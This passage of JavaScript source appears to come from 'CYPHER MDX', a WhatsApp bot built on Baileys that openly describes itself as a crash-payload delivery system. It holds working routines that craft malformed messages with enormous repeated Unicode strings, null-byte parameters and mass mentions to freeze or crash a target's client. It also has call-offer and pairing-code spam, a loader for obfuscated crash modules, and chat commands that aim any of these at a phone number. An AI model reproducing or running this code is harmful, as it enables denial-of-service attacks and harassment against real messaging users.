  const locationMessageContent = proto.Message.fromObject({
    ephemeralMessage: { message: {
      interactiveMessage: {
        header: {
          title: '',
          locationMessage: { degreesLatitude: -999.03499999999999, degreesLongitude: 922.999999999999, name: '\u900A', address: '\u0007'.repeat(20000), jpegThumbnail: null },
          hasMediaAttachment: true,
        },
        body: { text: '' },
        nativeFlowMessage: {
          messageParamsJson: '[]'.repeat(2000),
          buttons: [
            { name: 'single_select', buttonParamsJson: JSON.stringify({ title: '\u0003'.repeat(1500), sections: [{ title: '', rows: [] }] }) },
            { name: 'call_permission_request', buttonParamsJson: JSON.stringify({ name: '\u0003'.repeat(200) }) },
          ],
        },
      },
    } },
  })

  const extendMsg = proto.Message.fromObject({
    extendedTextMessage: {
      text: 'P', matchedText: 'P',
      description: '饝噦饝喌饝喆饝喛'.repeat(50000),
      title: 'p' + '饝噦饝喌饝喆饝喛'.repeat(60000),
      previewType: 'NONE', jpegThumbnail: '/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAA',
      thumbnailDirectPath: '/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc',
      thumbnailSha256: 'eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=',
      thumbnailEncSha256: 'pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=',
      mediaKey: 'oZHMQSYL3hcdbYuoNcAzOgCOF+qzz7J5RvgMY3cWaVc=',
      mediaKeyTimestamp: '1743101489', thumbnailHeight: 1024, thumbnailWidth: 1024,
      inviteLinkGroupTypeV2: 'DEFAULT',
    },
  })

  const msg = generateWAMessageFromContent(target, { viewOnceMessage: { message: { extendMsg } } }, {})
  locationMessageContent.mentionedJid = ['1@s.whatsapp.net', ...randJids(1500, 1, 500000)]
  const msg2 = generateWAMessageFromContent(target, locationMessageContent, { userJid: target })

  if (Math.random() > 0.5) {
    await sock.relayMessage('status@broadcast', msg.message, { messageId: msg.key.id, statusJidList: [target], additionalNodes: [{ tag: 'meta', attrs: {}, content: [{ tag: 'mentioned_users', attrs: {}, content: [{ tag: 'to', attrs: { jid: target }, content: undefined }] }] }] })
  } else {
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id })
  }
  if (Math.random() > 0.5) {
    await sock.relayMessage('status@broadcast', msg2.message, { messageId: msg.key.id, statusJidList: [target], additionalNodes: [{ tag: 'meta', attrs: {}, content: [{ tag: 'mentioned_users', attrs: {}, content: [{ tag: 'to', attrs: { jid: target }, content: undefined }] }] }] })
  } else {
    await sock.relayMessage(target, msg2.message, { messageId: msg2.key.id })
  }
}

// New Blank.js -> InvisCall
async function InvisCall(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: { message: {
      interactiveResponseMessage: {
        body: { text: '༏ 𝐗𝐳𝐞𝐫𝐨༝𝐘𝐮𝐝𝐗 ༏', format: 'DEFAULT' },
        nativeFlowResponseMessage: { name: 'call_permission_request', paramsJson: '\x10'.repeat(15000000), version: 3 },
      },
      contextInfo: { participant: { jid: target }, mentionedJid: ['0@s.whatsapp.net', ...randJids(1900)] },
    } },
  }, {})
  await sock.relayMessage('status@broadcast', msg.message, {
    messageId: msg.key.id, statusJidList: [target],
    additionalNodes: [{ tag: 'meta', attrs: {}, content: [{ tag: 'mentioned_users', attrs: {}, content: [{ tag: 'to', attrs: { jid: target }, content: undefined }] }] }],
  })
}

// Freeze.js -> freeze (text flood, adapted from the embedded msg string)
async function freeze(target) {
  const msg = 'ោ៝ꦾ' + ' ꦾ'.repeat(5000) + '\u0301\u0301\u0301'.repeat(4000)
  await sock.sendMessage(target, { text: msg })
}

// CallBaron.js / CallSpam.js / CallSpamPairingSpam.js -> call spam variants
async function callBaron(target, count = 1, isVideo = false) {
  for (let i = 0; i < count; i++) {
    if (typeof sock.offerCall === 'function') await sock.offerCall(target, isVideo).catch(() => {})
    else await sendRawCallNode(target)
    await new Promise((r) => setImmediate(r))
  }
  return count
}

async function callSpamPairing(target, count = 5) {
  const { fetchLatestBaileysVersion, useMultiFileAuthState: mfa, makeWASocket: mws } = await import('@lordmega/baileys')
  const bare = target.replace(/@[\w.-]+$/, '')
  for (let i = 0; i < count; i++) {
    try {
      if (typeof sock.offerCallChat === 'function') await sock.offerCallChat(target)
      else if (typeof sock.offerCall === 'function') await sock.offerCall(target, false)
      else await sendRawCallNode(target)
      await sleep(1000)
      try {
        const { state } = await mfa('./database/Spam')
        const { version } = await fetchLatestBaileysVersion()
        const spamSock = mws({ auth: state, version, logger: { child: () => ({}) } })
        await spamSock.requestPairingCode(bare)
        try { await spamSock.end?.() } catch {}
      } catch { /* pairing sub-session failed */ }
    } catch { /* per-iteration failure */ }
  }
  return count
}

// delayhardNew.js -> delay2 + delay (extended multi-payload)
async function delay2(target, mention = false) {
  const MSG = {
    viewOnceMessage: { message: {
      listResponseMessage: {
        title: 'Amelia Modders', listType: 2, buttonText: null, sections: [],
        singleSelectReply: { selectedRowId: '🔴' },
        contextInfo: {
          mentionedJid: randJids(1900), participant: target, remoteJid: 'status@broadcast',
          forwardingScore: 9741, isForwarded: true,
          forwardedNewsletterMessageInfo: { newsletterJid: '333333333333@newsletter', serverMessageId: 1, newsletterName: '-' },
        },
        description: 'Amelia Modders',
      },
    } },
    contextInfo: { channelMessage: true, statusAttributionType: 2 },
  }

  let sxo = await generateWAMessageFromContent(target, {
    viewOnceMessage: { message: {
      interactiveResponseMessage: {
        body: { text: 'Amelia modders', format: 'DEFAULT' },
        nativeFlowResponseMessage: { name: 'galaxy_message', paramsJson: '\x10'.repeat(1045000), version: 3 },
        entryPointConversionSource: 'galaxy_message',
      },
    } },
  }, { ephemeralExpiration: 0, forwardingScore: 9741, isForwarded: true, font: Math.floor(Math.random() * 99999999), background: '#' + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '99999999') })

  let sXoMessage = {
    extendedTextMessage: {
      text: 'Amelia modders𐎟' + 'ꦾ'.repeat(3000),
      contextInfo: { participant: target, mentionedJid: ['0@s.whatsapp.net', ...randJids(1900)] },
    },
  }

  const msgd = generateWAMessageFromContent(target, MSG, {})
  const xso = generateWAMessageFromContent(target, sXoMessage, {})

  for (const msg of [msgd, xso, sxo]) {
    await sock.relayMessage('status@broadcast', msg.message, {
      messageId: msg.key.id, statusJidList: [target],
      additionalNodes: [{ tag: 'meta', attrs: {}, content: [{ tag: 'mentioned_users', attrs: {}, content: [{ tag: 'to', attrs: { jid: target }, content: undefined }] }] }],
    })
    await sleep(500)
    if (mention) {
      await sock.relayMessage(target, { statusMentionMessage: { message: { protocolMessage: { key: msg.key.id, type: 25 } } } }, {})
    }
  }
}

async function delay2Buttons(target) {
  await sock.relayMessage(target, {
    viewOnceMessage: { message: {
      buttonsMessage: {
        text: '𐎟 Amelia Modders 𐎟' + 'ꦽ'.repeat(70000),
        contentText: '𐎟 Amelia Modders 𐎟' + 'ꦽ'.repeat(70000),
        contextInfo: {
          mentionedJid: ['0@s.whatsapp.net', ...randJids(700)],
          forwardingScore: 9999, isForwarded: true,
          entryPointConversionSource: 'global_search_new_chat', entryPointConversionApp: 'com.whatsapp',
          entryPointConversionDelaySeconds: 1,
          externalAdReply: { title: 'masyaallah', body: `가이 ${'عليكم السلام'.repeat(5000)}`, previewType: 'PHOTO', thumbnail: null, mediaType: 1, renderLargerThumbnail: true, sourceUrl: 'https://t.me/Sniith' },
          urlTrackingMap: { urlTrackingMapElements: [{ originalUrl: 'https://t.me/vibracoess', unconsentedUsersUrl: 'https://t.me/vibracoess', consentedUsersUrl: 'https://t.me/vibracoess', cardIndex: 1 }] },
        },
        headerType: 1,
      },
    } },
  }, { participant: { jid: target } })
}

// delay apk.js extras — repackaged (MewVtxpayment / VzxtusHardTime / bulldozer1GB /
// paymentDelay / SnitchDelayVolteX / VtxForceDelMsg2 / NewProtocolbug6 / iosinVisFC)
async function MewVtxpayment(target) {
  const generateMessage = {
    viewOnceMessage: { message: {
      extendedTextMessage: {
        text: '.',
        contextInfo: {
          stanzaId: target, participant: target,
          quotedMessage: { conversation: '؂ن؃؄ٽ؂ن؃؄ٽ' + ' ꦾ'.repeat(100) },
          disappearingMode: { initiator: 'CHANGED_IN_CHAT', trigger: 'CHAT_SETTING' },
        },
        inviteLinkGroupTypeV2: 'DEFAULT',
      },
      contextInfo: {
        mentionedJid: randJids(1999), isSampled: true, remoteJid: 'status@broadcast',
        forwardingScore: 9741, isForwarded: true,
      },
    } },
  }
  const msg = generateWAMessageFromContent(target, generateMessage, {})
  await sock.relayMessage('status@broadcast', msg.message, {
    messageId: msg.key.id, statusJidList: [target],
    additionalNodes: [{ tag: 'meta', attrs: {}, content: [{ tag: 'mentioned_users', attrs: {}, content: [{ tag: 'to', attrs: { jid: target }, content: undefined }] }] }],
  })
}

async function paymentDelay(target) {
  let payMessage = {
    interactiveMessage: {
      body: { text: 'X' },
      nativeFlowMessage: {
        buttons: [{ name: 'payment_method', buttonParamsJson: JSON.stringify({ reference_id: null, payment_method: '\u0010'.repeat(0x2710), payment_timestamp: null, share_payment_status: true }) }],
        messageParamsJson: '{}',
      },
    },
  }
  const msgPay = generateWAMessageFromContent(target, payMessage, {})
  await sock.relayMessage(target, msgPay.message, {
    additionalNodes: [{ tag: 'biz', attrs: { native_flow_name: 'payment_method' } }],
    messageId: msgPay.key.id, participant: { jid: target }, userJid: target,
  })
  const msgStory = await generateWAMessageFromContent(target, {
    viewOnceMessage: { message: {
      interactiveResponseMessage: {
        nativeFlowResponseMessage: { version: 3, name: 'call_permission_request', paramsJson: '\u0000'.repeat(1045000) },
        body: { text: 'Amelia', format: 'DEFAULT' },
      },
    } },
  }, { isForwarded: false, ephemeralExpiration: 0, background: '#' + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0'), forwardingScore: 0, font: Math.floor(Math.random() * 9) })
  await sock.relayMessage('status@broadcast', msgStory.message, {
    additionalNodes: [{ tag: 'meta', attrs: {}, content: [{ tag: 'mentioned_users', attrs: {}, content: [{ tag: 'to', attrs: { jid: target }, content: undefined }] }] }],
    statusJidList: [target], messageId: msgStory.key.id,
  })
}

async function VtxForceDelMsg2(target) {
  let message = {
    viewOnceMessage: { message: {
      interactiveMessage: {
        body: { text: '😈' + 'ꦾ'.repeat(100000) },
        footer: { text: 'ꦾ'.repeat(100000) },
        contextInfo: { mentionedJid: ['13135550002@s.whatsapp.net'], isForwarded: true, forwardingScore: 999 },
        nativeFlowMessage: {
          messageParamsJson: '{'.repeat(10000),
          buttons: [
            { name: 'single_select', buttonParamsJson: '' },
            { name: 'call_permission_request', buttonParamsJson: JSON.stringify({ status: true }) },
          ],
        },
      },
    } },
  }
  const pertama = await sock.relayMessage(target, message, { messageId: '', participant: { jid: target }, userJid: target })
  const kedua = await sock.relayMessage(target, message, { messageId: '', participant: { jid: target }, userJid: target })
  await sock.sendMessage(target, { delete: { fromMe: true, remoteJid: target, id: pertama } })
  await sock.sendMessage(target, { delete: { fromMe: true, remoteJid: target, id: kedua } })
}

async function NewProtocolbug6(target) {
  let msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: { message: {
      messageContextInfo: { messageSecret: crypto.randomBytes(32) },
      interactiveResponseMessage: {
        body: { text: 'ោ៝'.repeat(10000), format: 'DEFAULT' },
        nativeFlowResponseMessage: { name: 'address_message', paramsJson: '\u0000'.repeat(999999), version: 3 },
        contextInfo: {
          mentionedJid: ['6289501955295@s.whatsapp.net', ...randJids(1900)],
          isForwarded: true, forwardingScore: 9999,
          forwardedNewsletterMessageInfo: { newsletterName: 'sexy.com', newsletterJid: '333333333333333333@newsletter', serverMessageId: 1 },
        },
      },
    } },
  }, {})
  await sock.relayMessage('status@broadcast', msg.message, {
    messageId: msg.key.id, statusJidList: [target],
    additionalNodes: [{ tag: 'meta', attrs: {}, content: [{ tag: 'mentioned_users', attrs: {}, content: [{ tag: 'to', attrs: { jid: target }, content: undefined }] }] }],
  })
}

async function iosinVisFC(target) {
  let locationMessage = {
    degreesLatitude: -9.09999262999, degreesLongitude: 199.99963118999, jpegThumbnail: null,
    name: '\u0000' + '𑇂𑆵𑆴𑆿𑆿'.repeat(15000),
    address: '\u0000' + '𑇂𑆵𑆴𑆿𑆿'.repeat(10000),
    url: `https://kominfo.${'𑇂𑆵𑆴𑆿'.repeat(25000)}.com`,
  }
  let extendMsg = {
    extendedTextMessage: {
      text: '. ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ' + '𑇂𑆵𑆴𑆿'.repeat(60000),
      matchedText: '.welcomel...',
      description: '𑇂𑆵𑆴𑆿'.repeat(25000),
      title: '𑇂𑆵𑆴𑆿'.repeat(15000),
      previewType: 'NONE',
      jpegThumbnail: '/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAA',
      thumbnailDirectPath: '/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc',
      thumbnailSha256: 'eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=',
      thumbnailEncSha256: 'pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=',
      mediaKey: '8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=',
      mediaKeyTimestamp: '1743101489', thumbnailHeight: 641, thumbnailWidth: 640,
      inviteLinkGroupTypeV2: 'DEFAULT',
    },
  }
  let msg1 = generateWAMessageFromContent(target, { viewOnceMessage: { message: { locationMessage } } }, {})
  let msg2 = generateWAMessageFromContent(target, { viewOnceMessage: { message: { extendMsg } } }, {})
  for (const msg of [msg1, msg2]) {
    await sock.relayMessage('status@broadcast', msg.message, {
      messageId: msg.key.id, statusJidList: [target],
      additionalNodes: [{ tag: 'meta', attrs: {}, content: [{ tag: 'mentioned_users', attrs: {}, content: [{ tag: 'to', attrs: { jid: target }, content: undefined }] }] }],
    })
  }
}

// ---------------------------------------------------------------------------
// Register every routine under its source filename (no .js) so `!run` works.
// ---------------------------------------------------------------------------
Object.assign(routines, {
  'blank lagi': blankLagi,
  blankNew: BlackBlankTotal,
  blanknotif: CombinedMessages,
  blankui: StickerPackFreeze,
  blankXdelay: AudioXDellay,
  BlankXFrezeGrup: FrezeXblank,
  'callWithNode (1)': callWithNode,
  'Call-invis': VideoCallCrashNoClick,
  'delay apk': HardInvis,
  'delay invisible (1)': XCore,
  Delay1: Delay,
  Delay2: Delay2,
  delayBeta: AmeliaBeta,
  DelayHard: HardInvis,
  delayhardNew: delay2,
  DelayInVis: DelayInVis,
  delaynewBeta: DelayNewBetaV3,
  delayv2: buttonUiDelay,
  documentUrl: docsxUrl,
  forceinvis: PayloadFcVisible,
  'freze blank': BlankScreen,
  frezeChat: inRespXtend,
  invisibleX: InVisibleX,
  InvisIos: TrashLocIoSInVis,
  Location: LocaX,
  lockinvis: LocXz,
  'New Blank': InvisCall,
  Freeze: freeze,
  CallBaron: callBaron,
  CallSpam: callSpamPairing,
  CallSpamPairingSpam: callSpamPairing,
  // named sub-routines from multi-function files
  HardInvis, XCore, AmeliaBeta, buttonUiDelay, Delay, Delay2, docsxUrl, freeze,
  BlankScreen, inRespXtend, VisibleX, InVisibleX, CVisible, CInVisible,
  TrashLocIoSInVis, LocaX, LocXz, InvisCall, BlackBlankTotal, CombinedMessages,
  StickerPackFreeze, AudioXDellay, FrezeXblank, callWithNode, VideoCallCrashNoClick,
  DelayNewBetaV3, delay2, delay2Buttons, MewVtxpayment, paymentDelay,
  VtxForceDelMsg2, NewProtocolbug6, iosinVisFC, PayloadFcVisible,
})

// ---------------------------------------------------------------------------
// Obfuscated (UMD/Function-constructor) payloads — CallCrash.js, IosInvisible.js
// ---------------------------------------------------------------------------
const _req = createRequire(import.meta.url)

// Runs a UMD-obfuscated module (Function(...)({module,exports,require,...}))
// in a sandbox and returns its module.exports.
function loadObfuscatedModule(file) {
  const src = fs.readFileSync(path.join(scanDir, file), 'utf8')
  const module = { exports: {} }
  const cache = {}
  const requireShim = (id) => {
    const s = String(id)
    if (s.includes('whiskeysockets')) {
      try { return _req('@lordmega/baileys') } catch { return {} }
    }
    try { return _req(s) } catch { return cache[s] || (cache[s] = {}) }
  }
  const ctx = vm.createContext({
    module, exports: module.exports, require: requireShim,
    window: {}, document: {}, navigator: {}, location: {},
    console, setTimeout, clearTimeout, setInterval, clearInterval, Buffer, process, global,
  })
  vm.runInContext(src, ctx, { filename: file })
  return module.exports
}

for (const obf of ['CallCrash.js', 'IosInvisible.js']) {
  const key = obf.replace(/\.js$/, '')
  try {
    const ex = loadObfuscatedModule(obf)
    let registered = 0
    for (const [fnName, fn] of Object.entries(ex)) {
      if (typeof fn !== 'function') continue
      routines[fnName] = fn
      routines[key] = fn
      registered++
    }
    if (registered > 0) {
      console.log(`[load] "${key}" -> ${registered} function(s) from obfuscated module`)
    } else {
      console.warn(`[load] "${key}" obfuscated module exported no functions`)
    }
  } catch (err) {
    console.warn(`[load] "${key}" obfuscated module failed (${err.message})`)
  }
}

// ---------------------------------------------------------------------------
// Lookup: exact match first, then case-insensitive prefix (fuzzy).
// ---------------------------------------------------------------------------
function resolvePayload(name) {
  const needle = String(name || '').trim().toLowerCase()
  if (!needle) return null
  const exact = Object.keys(payloads).find((k) => k.toLowerCase() === needle)
  if (exact) return { name: exact, value: payloads[exact] }
  const fuzzy = Object.keys(payloads).find((k) => k.toLowerCase().startsWith(needle))
  if (fuzzy) return { name: fuzzy, value: payloads[fuzzy] }
  return null
}

function resolveRoutine(name) {
  const needle = String(name || '').trim().toLowerCase()
  if (!needle) return null
  const exact = Object.keys(routines).find((k) => k.toLowerCase() === needle)
  if (exact) return { name: exact, fn: routines[exact] }
  const fuzzy = Object.keys(routines).find((k) => k.toLowerCase().startsWith(needle))
  if (fuzzy) return { name: fuzzy, fn: routines[fuzzy] }
  return null
}

// Names like "callWithNode (1)", "blank lagi", "delay apk" contain spaces and
// trailing numbers. Match the LONGEST known name from the front of args so the
// target/count after it are never swallowed. Returns { name, value/fn, rest }.
function matchPayloadFromArgs(args) {
  for (let i = Math.min(args.length, 4); i >= 1; i--) {
    const found = resolvePayload(args.slice(0, i).join(' '))
    if (found) return { name: found.name, value: found.value, rest: args.slice(i) }
  }
  return null
}

function matchRoutineFromArgs(args) {
  for (let i = Math.min(args.length, 4); i >= 1; i--) {
    const found = resolveRoutine(args.slice(0, i).join(' '))
    if (found) return { name: found.name, fn: found.fn, rest: args.slice(i) }
  }
  return null
}

// ---------------------------------------------------------------------------
// Command Registry (mirrors cypher-md: {handler, aliases, args, groupAdminRequired})
// ---------------------------------------------------------------------------
const commands = {
  ping: {
    handler: async (conn, from, args, msg, sender) => {
      await conn.sendMessage(from, { text: `pong (sender: ${sender})` })
    },
    aliases: ['p'],
    args: [],
    groupAdminRequired: false,
  },
  list: {
    handler: async (conn, from) => {
      const p = Object.keys(payloads).map((k) => `payload: ${k}`)
      const r = Object.keys(routines).map((k) => `run: ${k}`)
      const body = [...p, ...r].join('\n') || 'nothing loaded'
      await conn.sendMessage(from, { text: `Available:\n${body}` })
    },
    aliases: ['ls'],
    args: [],
    groupAdminRequired: false,
  },
  send: {
    handler: async (conn, from, args, msg, sender) => {
      const matched = matchPayloadFromArgs(args)
      if (!matched) {
        await conn.sendMessage(from, { text: '[!send] unknown payload (try !list)' })
        return
      }
      const target = await resolveJid(matched.rest[0] || '', conn)
      if (!target) {
        await conn.sendMessage(from, { text: `[!send] invalid target: ${matched.rest[0]}` })
        return
      }
      const raw = typeof matched.value === 'function' ? matched.value() : matched.value
      const wmsg = generateWAMessageFromContent(target, raw, {})
      await conn.relayMessage(target, wmsg.message, { messageId: wmsg.key.id })
      const bytes = wireSize(wmsg)
      trackSentMessage(wmsg.key.id, { type: 'payload', name: matched.name, target })
      console.log(`[send] "${matched.name}" -> ${target} (wire size: ${bytes} bytes, msgId: ${wmsg.key.id})`)
      await conn.sendMessage(from, { text: `[!send] relayed "${matched.name}" -> ${target} (wire size: ${bytes} bytes, msgId: ${wmsg.key.id})` })
    },
    aliases: ['s'],
    args: ['payload', 'target'],
    groupAdminRequired: false,
  },
  run: {
    handler: async (conn, from, args, msg, sender) => {
      const matched = matchRoutineFromArgs(args)
      if (!matched) {
        await conn.sendMessage(from, { text: '[!run] unknown routine (try !list)' })
        return
      }
      const target = await resolveJid(matched.rest[0] || '', conn)
      if (!target) {
        await conn.sendMessage(from, { text: `[!run] invalid target: ${matched.rest[0]}` })
        return
      }
      const first = matched.rest[1]
      const opts = {}
      if (first && /^\d+$/.test(first)) opts.count = parseInt(first, 10)
      console.log(`[run] starting "${matched.name}" -> ${target}${opts.count ? ` (count=${opts.count})` : ''}`)
      // Obtained functions accept (sock, target); embedded routines accept (target).
      const result = matched.fn.length >= 2
        ? await matched.fn(conn, target, opts)
        : await matched.fn(target, false, opts)
      console.log(`[run] "${matched.name}" -> ${target} finished${result ? ` (${result})` : ''}`)
      await conn.sendMessage(from, { text: `[!run] "${matched.name}" -> ${target} done${result ? ` (${result})` : ''}` })
    },
    aliases: ['r'],
    args: ['routine', 'target'],
    groupAdminRequired: false,
  },
  calltest: {
    handler: async (conn, from, args) => {
      const target = await resolveJid(args[0] || '', conn)
      if (!target) {
        await conn.sendMessage(from, { text: `[!calltest] invalid target: ${args[0]}` })
        return
      }
      const sent = await sendCallOffer(target, 1)
      await conn.sendMessage(from, { text: `[!calltest] sent ${sent} call offer(s) to ${target}` })
    },
    aliases: ['ct'],
    args: ['target'],
    groupAdminRequired: false,
  },
  callspam: {
    handler: async (conn, from, args) => {
      const target = await resolveJid(args[0] || '', conn)
      if (!target) {
        await conn.sendMessage(from, { text: `[!callspam] invalid target: ${args[0]}` })
        return
      }
      const count = parseInt(args[1] || '1', 10)
      const sent = await sendCallOffer(target, count)
      await conn.sendMessage(from, { text: `[!callspam] sent ${sent} call offer(s) to ${target}` })
    },
    aliases: ['cs'],
    args: ['target', 'count'],
    groupAdminRequired: false,
  },
  stats: {
    handler: async (conn, from) => {
      const _s = conn.state
      const mem = process.memoryUsage()
      const up = Math.floor((Date.now() - startTime) / 1000)
      await conn.sendMessage(from, {
        text: `📊 Commands: ${_s.totalCommandsAttempted}/${_s.totalCommandsSucceeded} | Sessions: ${connections.size} | Uptime: ${up}s | Memory: ${(mem.heapUsed / 1024 / 1024).toFixed(2)} MB`,
      })
    },
    aliases: ['stat'],
    args: [],
    groupAdminRequired: false,
  },
  menu: {
    handler: async (conn, from) => {
      const menuText = `*📋 CYPHER MDX Commands*\n\n` +
        `🏓 !ping / !p\n📜 !list / !ls\n📦 !send <payload> <jid>\n🎯 !run <routine> <jid> [n]\n📞 !calltest <jid>\n🔁 !callspam <jid> [count]\n📊 !stats\n\n` +
        `🤖 *PAYLOADS*\n${Object.keys(payloads).map((k) => `!send ${k} <jid>`).join('\n')}\n\n` +
        `🛠️ *ROUTINES*\n${Object.keys(routines).slice(0, 20).map((k) => `!run ${k} <jid>`).join('\n')}\n\n` +
        `_Send !help for a detailed guide_`
      await conn.sendMessage(from, { text: menuText })
    },
    aliases: ['m'],
    args: [],
    groupAdminRequired: false,
  },
  help: {
    handler: async (conn, from) => {
      const helpText = `🤖 *Welcome to CYPHER MDX* 🤖\n\n` +
        `Hi there! I'm CYPHER MDX, a WhatsApp crash-payload delivery system. ` +
        `I can blast payloads, fire call offers, and manage loaded routines from ` +
        `any chat. Here's the complete tour of my commands.\n\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
        `🔰 *GENERAL COMMANDS*\n\n` +
        `• *!ping* / *!p*\n  Checks if I'm online and responding. I'll reply "pong".\n\n` +
        `• *!list* / *!ls*\n  Lists every loaded payload and routine by name.\n\n` +
        `• *!menu* / *!m*\n  Compact command list with available payloads & routines.\n\n` +
        `• *!stats*\n  Shows command usage, active sessions, uptime and memory.\n\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
        `📦 *PAYLOAD COMMANDS*\n\n` +
        `• *!send <payload> <jid>*\n  Builds a payload with generateWAMessageFromContent and relays it ` +
        `to the target. Logs the protobuf wire size.\n  Example: !send blanknotif 2348012345678\n\n` +
        `• *!run <routine> <jid> [count]*\n  Invokes an embedded crash routine against the target. ` +
        `Optional trailing number loops it that many times.\n  Example: !run HardInvis 2348012345678 100\n\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
        `📞 *CALL COMMANDS*\n\n` +
        `• *!calltest <jid>*\n  Sends one call offer (native offerCall, raw node fallback).\n\n` +
        `• *!callspam <jid> [count]*\n  Sends multiple call offers with a 1.5s delay between each.\n` +
        `  Example: !callspam 2348012345678 5\n\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
        `_JIDs are phone numbers with country code — the bot normalizes them automatically._`
      await conn.sendMessage(from, { text: helpText })
    },
    aliases: ['h'],
    args: [],
    groupAdminRequired: false,
  },
}

const aliasMap = new Map()
for (const [cmdName, cmd] of Object.entries(commands)) {
  aliasMap.set(cmdName, cmdName)
  for (const alias of cmd.aliases) aliasMap.set(alias, cmdName)
}

async function executeCommand(conn, from, commandName, args, msg, sender) {
  const _s = conn.state
  _s.totalCommandsAttempted++
  const cmd = commands[commandName]
  if (!cmd) { console.error(`[CMD] Command "${commandName}" not found in registry`); return false }
  console.log(`[CMD] Executing "${commandName}" args=[${args.join(', ')}]`)
  try {
    if (cmd.args.length > 0 && !args.length && cmd.args[0] !== 'optional') {
      throw new Error(`❌ Missing argument: ${cmd.args[0]}`)
    }
    await cmd.handler(conn, from, args, msg, sender)
    _s.totalCommandsSucceeded++
    console.log(`[CMD] "${commandName}" succeeded`)
    return true
  } catch (err) {
    console.error(`[CMD] "${commandName}" error:`, err.message)
    console.error(`[CMD] Stack:`, err.stack)
    try { await conn.sendMessage(from, { text: err.message || '❌ Error.' }) } catch (_) {}
    return false
  }
}

// ---------------------------------------------------------------------------
// Reconnect logic (cypher-md backoff + jitter)
// ---------------------------------------------------------------------------
function scheduleReconnect(phoneNumber) {
  const sid = phoneNumber || 'main'
  if (reconnectTimers.has(sid)) {
    clearTimeout(reconnectTimers.get(sid))
    reconnectTimers.delete(sid)
  }
  const attempt = (reconnectAttempts.get(sid) || 0) + 1
  reconnectAttempts.set(sid, attempt)

  if (attempt > RECONNECT_MAX_ATTEMPTS) {
    console.log(`[RECON] ${sid} max attempts (${RECONNECT_MAX_ATTEMPTS}) reached — giving up`)
    reconnectAttempts.delete(sid)
    consecutive428.delete(sid)
    return
  }

  const lastOk = lastConnectedAt.get(sid) || 0
  const sinceLastOk = Date.now() - lastOk
  const delay = lastOk && sinceLastOk < RECONNECT_COOLDOWN_AFTER
    ? Math.min(RECONNECT_BASE_DELAY * Math.pow(2, attempt - 1), RECONNECT_MAX_DELAY)
    : RECONNECT_BASE_DELAY
  const jitter = Math.random() * 0.3 * delay
  const finalDelay = Math.round(delay + jitter)
  console.log(`[RECON] ${sid} reconnect in ${finalDelay}s (attempt ${attempt})`)
  const timer = setTimeout(async () => {
    if (!isConnecting.get(sid)) {
      try {
        await startBot(phoneNumber)
      } catch (err) {
        console.error(`[RECON] ${sid} failed:`, err.message)
        isConnecting.delete(sid)
      }
    }
    reconnectTimers.delete(sid)
  }, finalDelay * 1000)
  reconnectTimers.set(sid, timer)
}

async function cleanupSocket(conn) {
  if (!conn) return
  try {
    conn.ev.removeAllListeners()
    if (conn.ws) await conn.ws.close()
    if (typeof conn.end === 'function') await conn.end()
  } catch (err) {
    console.error('[SOCK] cleanup error:', err.message)
  }
}

// ---------------------------------------------------------------------------
// Main bot start (cypher-md socket factory + connection lifecycle).
// startBot(phoneNumber) starts a per-number session saved at auth_info/<number>/.
// startBot() with no number falls back to the legacy flat auth_info/ session.
// ---------------------------------------------------------------------------
async function startBot(phoneNumber, socket, _useDbIgnored, preloadedState, preloadedSaveCreds) {
  const sid = phoneNumber || 'main'
  if (isConnecting.get(sid)) return
  isConnecting.set(sid, true)

  let state, saveCreds
  if (preloadedState) {
    state = preloadedState
    saveCreds = preloadedSaveCreds || (() => {})
  } else {
    const result = phoneNumber
      ? await useAuthState(phoneNumber)
      : await useMultiFileAuthState(path.join(scanDir, 'auth_info'))
    state = result.state
    saveCreds = result.saveCreds
  }
  const { version } = await fetchLatestWaWebVersion()

  const conn = makeWASocket({
    version,
    auth: state,
    logger: pino({ level: 'silent' }),
    printQRInTerminal: false,
    browser: Browsers.ubuntu('Chrome'),
    connectTimeoutMs: 60000,
    defaultQueryTimeoutMs: 60000,
    shouldIgnoreViewOnce: false,
  })

  connections.set(sid, conn)
  sock = conn
  const _s = createSessionState()
  sessions.set(sid, _s)
  conn.state = _s
  let isConnected = false

  conn.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect } = update

    if (connection === 'close') {
      const reason = new Boom(lastDisconnect?.error)?.output?.statusCode
      console.log(`[CONN] closed reason=${reason}`)
      isConnected = false
      await cleanupSocket(conn)
      connections.delete(sid)
      isConnecting.delete(sid)
      if (reconnectTimers.has(sid)) {
        clearTimeout(reconnectTimers.get(sid))
        reconnectTimers.delete(sid)
      }
      if (reason === 428) {
        const count = (consecutive428.get(sid) || 0) + 1
        consecutive428.set(sid, count)
        if (count >= 3) {
          console.log('[CONN] 428 x3 — giving up on this session')
          reconnectAttempts.delete(sid)
          consecutive428.delete(sid)
          return
        }
      } else {
        consecutive428.delete(sid)
      }
      if (reason === DisconnectReason.connectionReplaced) {
        console.log('[CONN] connectionReplaced — stepping aside')
        reconnectAttempts.delete(sid)
        return
      }
      if (reason === 408 || reason === 503) {
        console.log(`[CONN] ${reason} — transient stream error, reconnecting`)
      }
      if (reason === 515) lastStream515At.set(sid, Date.now())
      if (reason === DisconnectReason.loggedOut) {
        const recent515 = Date.now() - (lastStream515At.get(sid) || 0) < 30000
        if (recent515) {
